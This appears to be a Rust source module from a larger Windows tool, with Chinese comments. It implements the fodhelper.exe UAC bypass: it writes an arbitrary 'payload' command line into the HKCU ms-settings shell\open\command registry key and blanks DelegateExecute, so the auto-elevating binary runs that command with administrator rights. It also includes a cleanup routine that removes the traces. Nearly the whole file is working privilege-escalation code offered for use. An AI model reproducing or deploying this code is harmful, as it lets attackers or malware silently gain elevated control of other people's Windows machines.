//! 提权用的注册表劫持：HKCU\Software\Classes\ms-settings\shell\open\command
//!
//! fodhelper.exe 会自动提升权限，并且会去读这个协议项；把它的默认值改成
//! 我们自己的命令行、再把 DelegateExecute 置空，shell 就会直接执行我们的命令。

use std::ffi::{OsStr, OsString};
use std::ptr;

use windows_sys::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExW, RegDeleteTreeW, RegSetValueExW, HKEY, HKEY_CURRENT_USER, KEY_WRITE,
    REG_OPTION_NON_VOLATILE, REG_SZ,
};

use crate::win::wide;

pub const COMMAND_KEY: &str = r"Software\Classes\ms-settings\shell\open\command";
pub const ROOT_KEY: &str = r"Software\Classes\ms-settings";
const DELEGATE: &str = "DelegateExecute";

pub fn setup(command_line: &OsStr) -> Result<(), String> {
    unsafe {
        let sub_key = wide(OsStr::new(COMMAND_KEY));
        let mut key: HKEY = ptr::null_mut();
        let mut disposition = 0u32;

        let code = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            sub_key.as_ptr(),
            0,
            ptr::null(),
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            ptr::null(),
            &mut key,
            &mut disposition,
        );
        if code != 0 {
            return Err(format!(
                "无法创建注册表项 {COMMAND_KEY}: {}",
                crate::win::error_text(code)
            ));
        }

        let value = wide(command_line);
        let code = RegSetValueExW(
            key,
            ptr::null(),
            0,
            REG_SZ,
            value.as_ptr().cast::<u8>(),
            (value.len() * std::mem::size_of::<u16>()) as u32,
        );
        if code != 0 {
            RegCloseKey(key);
            return Err(format!(
                "无法写入提权命令行: {}",
                crate::win::error_text(code)
            ));
        }

        let name = wide(OsStr::new(DELEGATE));
        let empty: [u16; 1] = [0];
        let code = RegSetValueExW(
            key,
            name.as_ptr(),
            0,
            REG_SZ,
            empty.as_ptr().cast::<u8>(),
            std::mem::size_of::<u16>() as u32,
        );
        RegCloseKey(key);

        if code != 0 {
            return Err(format!(
                "无法写入 DelegateExecute: {}",
                crate::win::error_text(code)
            ));
        }
        Ok(())
    }
}

/// 删掉整棵 ms-settings，恢复原状。调用多次也安全。
pub fn cleanup() {
    unsafe {
        let root = wide(OsStr::new(ROOT_KEY));
        RegDeleteTreeW(HKEY_CURRENT_USER, root.as_ptr());
    }
}

/// 注册表默认值里能放的只有纯 ASCII 载荷，拼接时不用担心引号。
pub fn build_command_line(exe: &OsStr, flag: &str, payload: &OsStr) -> OsString {
    let mut line = OsString::from("\"");
    line.push(exe);
    line.push("\" ");
    line.push(flag);
    line.push(" ");
    line.push(payload);
    line
}
